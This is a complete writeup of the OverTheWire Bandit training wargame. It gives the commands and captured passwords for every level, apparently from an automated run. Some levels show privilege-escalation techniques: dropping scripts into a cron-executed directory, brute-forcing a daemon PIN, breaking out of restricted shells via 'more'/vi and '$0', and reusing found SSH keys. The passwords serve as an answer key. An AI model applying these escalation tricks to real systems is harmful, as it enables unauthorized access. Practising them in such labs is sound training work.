# OverTheWire Bandit — Writeup

**Solved from DGX 5** (ASUS Ascent GX10 Spark; all game connections originated there, reached via DGX 1 → DGX 5 → `bandit.labs.overthewire.org:2220`)
**Date:** 2026-10-20
**Result:** All levels solved — bandit0 through bandit33. Bandit33 is the final level (its home README says "Congratulations on solving the last level of this game!"); there is no bandit34 account.

Conventions: each level lists the account you log in as, the goal, the exact technique/commands, and the password obtained for the next level. Passwords below are the live game passwords captured during this run — each was verified by using it to log in to the next level.

---

## Level 0 → bandit1
- **Goal:** Read the password stored in `~/readme`.
- **Commands:** `cat ~/readme` (log in as bandit0, password `bandit0`).
- **Password for bandit1:** `6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR`

## Level 1 → bandit2
- **Goal:** Read a file literally named `-` in the home directory.
- **Commands:** `cat ./-` (the `./` stops `-` being parsed as a flag/stdin).
- **Password for bandit2:** `PK8fYLZg2hnHSz83plBL1iEPKdD3QToB`

## Level 2 → bandit3
- **Goal:** Read a file whose name contains spaces (and leading dashes in this instance).
- **Commands:** `cat "./--spaces in this filename--"` (quoting handles the spaces).
- **Password for bandit3:** `7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME`

## Level 3 → bandit4
- **Goal:** Find the hidden file inside the `inhere` directory.
- **Commands:** `ls -la inhere/` then `cat inhere/...Hiding-From-You`.
- **Password for bandit4:** `xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq`

## Level 4 → bandit5
- **Goal:** Among many binary files in `inhere`, find the one human-readable file.
- **Commands:** `file inhere/*` → only `-file07` is ASCII text; `cat inhere/-file07`.
- **Password for bandit5:** `6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG`

## Level 5 → bandit6
- **Goal:** Find a file that is 1033 bytes, not executable, human-readable, somewhere under `inhere`.
- **Commands:** `find inhere -type f -size 1033c ! -executable` → `maybehere07/.file2`; `cat` it.
- **Password for bandit6:** `pXa26xhMWaC2SvDotA4r9EgZkulOeSBW`

## Level 6 → bandit7
- **Goal:** Find a 33-byte file owned by user bandit7 and group bandit6, anywhere on the system.
- **Commands:** `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null` → `/var/lib/dpkg/info/bandit7.password`; `cat` it.
- **Password for bandit7:** `Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3`

## Level 7 → bandit8
- **Goal:** Find the password next to the word "millionth" in `data.txt`.
- **Commands:** `grep millionth data.txt`.
- **Password for bandit8:** `VR1ljMayciFxbnUokuQmJFw6QC9VKtub`

## Level 8 → bandit9
- **Goal:** Find the one line in `data.txt` that occurs only once.
- **Commands:** `sort data.txt | uniq -u`.
- **Password for bandit9:** `EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl`

## Level 9 → bandit10
- **Goal:** Find the password hidden in a binary file, in a human-readable string preceded by several `=` characters.
- **Commands:** `strings data.txt | grep ===`.
- **Password for bandit10:** `B0s2khmbT9u0geKuOoVGW3JZKhndE3BG`

## Level 10 → bandit11
- **Goal:** `data.txt` is base64-encoded; decode it.
- **Commands:** `base64 -d data.txt`.
- **Password for bandit11:** `pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro`

## Level 11 → bandit12
- **Goal:** `data.txt` is ROT13-encoded; rotate the letters back.
- **Commands:** `cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`.
- **Password for bandit12:** `GROozWPO8QyN0mGrjUkID0WCYkZiQxrN`

## Level 12 → bandit13
- **Goal:** `data.txt` is a hexdump of a file compressed many times over (gzip / bzip2 / xz / tar layers).
- **Commands:** work in a scratch dir; `xxd -r ~/data.txt > cur`, then loop: inspect with `file -b cur` and decompress to stdout with `gzip -dc`, `bzip2 -dc`, `xz -dc` or `tar -xOf` as appropriate, replacing `cur` each round, until `file` reports ASCII text; `cat cur`.
- **Password for bandit13:** `qQYQiHOBPR8zR61qxYqX45quvihF2uzk`

## Level 13 → bandit14
- **Goal:** The home directory contains a private SSH key (`sshkey.private`) for bandit14 instead of password data.
- **Commands:** use the key to log in as bandit14 and read its password file.
- **Special handling:** SSH from localhost is blocked on this game backend ("Connecting from/to localhost is blocked"), so the key was copied to DGX 5, `chmod 600`, and used to log in directly from DGX 5: `ssh -i sshkey.private -p 2220 bandit14@bandit.labs.overthewire.org 'cat /etc/bandit_pass/bandit14'`.
- **Password for bandit14:** `aaWecNkG4FhxJQxz07uiwzVP6bJiYS65`

## Level 14 → bandit15
- **Goal:** Submit the current level's password to a daemon listening on localhost port 30000.
- **Commands:** `echo aaWecNkG4FhxJQxz07uiwzVP6bJiYS65 | nc -q 2 localhost 30000` → daemon answers "Correct!" plus the next password.
- **Password for bandit15:** `pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7`

## Level 15 → bandit16
- **Goal:** Same idea as 14, but the daemon on localhost port 30001 requires SSL.
- **Commands:** `echo pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7 | openssl s_client -connect localhost:30001 -quiet`.
- **Password for bandit16:** `kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V`

## Level 16 → bandit17
- **Goal:** Several services listen on localhost ports 31000–32000; most just echo input back. One (SSL) returns credentials for bandit17 when given the current password.
- **Commands:** `nmap -p 31000-32000 --open localhost` (open: 31046, 31518, 31691, 31790, 31960); probe each plain (`nc`) and with SSL (`openssl s_client`). Port **31790 over SSL** answered "Correct!" and returned an OpenSSH private key for bandit17. The key was saved on DGX 5 (`chmod 600`) and used to log in as bandit17 → `cat /etc/bandit_pass/bandit17`.
- **Password for bandit17:** `pWXMAZoxGC8JmDMfmT5MGEsobMM3vnj2`

## Level 17 → bandit18
- **Goal:** `passwords.old` and `passwords.new` differ in exactly one line; the new line is the next password.
- **Commands:** `diff passwords.old passwords.new`.
- **Password for bandit18:** `OQxXZjELndr90zuhOTDYBEomI0SZITXI`

## Level 18 → bandit19
- **Goal:** The password is in `~/readme`, but bandit18's `.bashrc` logs you out immediately on interactive login.
- **Commands:** run a remote command non-interactively, which skips the interactive-shell logout: `ssh -p 2220 bandit18@bandit.labs.overthewire.org 'cat ~/readme'` (via sshpass from DGX 5).
- **Password for bandit19:** `KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI`

## Level 19 → bandit20
- **Goal:** Use the setuid binary `bandit20-do` in the home directory, which runs any command as bandit20.
- **Commands:** `./bandit20-do cat /etc/bandit_pass/bandit20`.
- **Password for bandit20:** `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA`

## Level 20 → bandit21
- **Goal:** The setuid binary `suconnect` connects to a TCP port on localhost; if it reads the current password from that port, it sends back the next password.
- **Commands:** start a listener that speaks first: `{ echo 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA; sleep 3; } | nc -l -p 4000 > /tmp/b20.out &` then `./suconnect 4000`; the reply in `/tmp/b20.out` is the next password.
...[truncated 6155 chars]
- **Password for bandit21:** `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`

## Level 21 → bandit22
- **Goal:** A cron job for bandit22 runs every minute; find where it leaves the password.
- **Commands:** `cat /etc/cron.d/cronjob_bandit22` → runs `/usr/bin/cronjob_bandit22.sh`; `cat /usr/bin/cronjob_bandit22.sh` → it copies `/etc/bandit_pass/bandit22` to `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` (world-readable); `cat` that file.
- **Password for bandit22:** `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz`

## Level 22 → bandit23
- **Goal:** Same pattern, but the cron script's output filename is an MD5 hash of a known string.
- **Commands:** `cat /usr/bin/cronjob_bandit23.sh` → target is `/tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)`; reproduce it: `cat /tmp/8ca319486bfbbc3663ea0fbe81326349`.
- **Password for bandit23:** `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`

## Level 23 → bandit24
- **Goal:** A cron job running as bandit24 executes every bandit23-owned script placed in `/var/spool/bandit24/foo`, then deletes it.
- **Commands:** read `/usr/bin/cronjob_bandit24.sh`; drop a script there: `cat /etc/bandit_pass/bandit24 > /tmp/b23out` plus `chmod 644 /tmp/b23out`; `chmod 755` the script; wait a minute; `cat /tmp/b23out`.
- **Password for bandit24:** `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

## Level 24 → bandit25
- **Goal:** A daemon on localhost gives out bandit25's password if given bandit24's password plus a secret 4-digit PIN — brute-force all 10,000 PINs.
- **Commands:** the daemon is on port **30002** (per the official level page — not 31000): `for i in $(seq -w 0 9999); do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done | nc -q 5 localhost 30002` and filter out the "Wrong" replies; the "Correct!" reply contains the password.
- **Password for bandit25:** `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`

## Level 25 → bandit26
- **Goal:** bandit25's home holds `bandit26.sshkey`, but bandit26's login shell is `/usr/bin/showtext` (`more ~/text.txt`) — escape it to a real shell.
- **Commands:** copy the key to DGX 5, `chmod 600`, and SSH in over a PTY with a **3-row terminal** (text.txt is only 6 lines / 258 bytes, so a normal-height terminal lets `more` show it without ever pausing). When `more` pauses, press `v` to open the file in vi, then `:set shell=/bin/bash` and `:shell` — now in a real bandit26 shell: `cat /etc/bandit_pass/bandit26`.
- **Password for bandit26:** `jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ`

## Level 26 → bandit27
- **Goal:** Use the setuid binary `bandit27-do` in bandit26's home.
- **Commands:** get a bandit26 shell via the same showtext/`more` → vi break-out as Level 25, then `./bandit27-do cat /etc/bandit_pass/bandit27`.
- **Password for bandit27:** `STJLJBRRphMxKB392CT4iOr5CbzPU9ER`

## Level 27 → bandit28
- **Goal:** Clone a git repository over SSH and read the password from it.
- **Commands:** from DGX 5 (localhost SSH is blocked server-side): `GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no' sshpass -p <bandit27 pw> git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo` — `README` states the next password verbatim.
- **Password for bandit28:** `y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ`

## Level 28 → bandit29
- **Goal:** Same git setup; the README in HEAD has the password redacted, but history remembers.
- **Commands:** clone the bandit28-git repo; `cat README.md` shows `password: xxxxxxxxxx`; `git log --oneline` shows a "fix info leak" commit; `git show ad8a5f8` (the commit before the redaction) reveals the real password.
- **Password for bandit29:** `Em7eGtqaMySwNFjCpwzzHhLhospOcdt0`

## Level 29 → bandit30
- **Goal:** Same git setup; production has no password, but another branch does.
- **Commands:** clone the bandit29-git repo; `git branch -a` lists `dev` and `sploits-dev` besides `master`; `git show origin/dev:README.md` contains the real credentials.
- **Password for bandit30:** `jq9Dfg2rXsfYsWMgFuKlXhphjdH7USgX`

## Level 30 → bandit31
- **Goal:** Same git setup; look beyond commits and branches — at tags.
- **Commands:** clone the bandit30-git repo; `git tag` lists a tag named `secret`; `git show secret` prints the password.
- **Password for bandit31:** `82NkymblpGBYmIXG6ZQ8YldBYstHpfUf`

## Level 31 → bandit32
- **Goal:** Push a file to the remote repository: `key.txt` containing `May I come in?` on branch `master`.
- **Commands:** clone the bandit31-git repo; `printf 'May I come in?' > key.txt`; `git add -f key.txt` (a `.gitignore` blocks `*.txt`, hence `-f`); `git commit`; `git push origin master`. The remote pre-receive hook validates the file and prints the next password while declining the push — by design.
- **Password for bandit32:** `pWuj5jBQ6IgV0NXwiH6g1pXRF8S1YvbT`

## Level 32 → bandit33
- **Goal:** bandit32's login shell is the setuid "uppercase shell": it uppercases everything you type, so no normal command works.
- **Commands:** over a PTY, type `$0` (no letters to uppercase) and Enter — it spawns a normal shell, which inherits the binary's effective uid bandit33. Then `cat /etc/bandit_pass/bandit33`.
- **Password for bandit33:** `u4P2CyPOwPGLe94RdD9Uo2FxFwvnFswM`

## Level 33 — final level
- **Goal:** None left: logging in as bandit33, its `~/README.txt` reads "Congratulations on solving the last level of this game!" There is no bandit34 account (`getent passwd bandit34` returns nothing). **Game complete.**

---

### Notes on special handling during this run
- **All traffic originated from DGX 5.** DGX 5 (WiFi-only) was reached by hopping DGX 1 → 192.168.86.67; every `ssh`/`git` connection to `bandit.labs.overthewire.org:2220` was made from DGX 5.
- **Localhost SSH is blocked** on the game backend ("Connecting from/to localhost is blocked to conserve resources"). Levels designed around `ssh user@localhost` from inside the server (13, 27–31) were instead done by bringing the credential to DGX 5 and connecting directly to the public host.
- **Level 24's daemon port** is 30002 per the official level page; the frequently-quoted 31000 belongs to other levels' service pools.
- **Level 25's `more` trap:** `~/text.txt` is only 6 lines, so the terminal must be shrunk to ~3 rows or `more` never pauses and the `v` → vi escape is impossible.
- Interactive levels (25, 26, 32) were driven over PTYs from DGX 5 with small Python `pty` scripts.
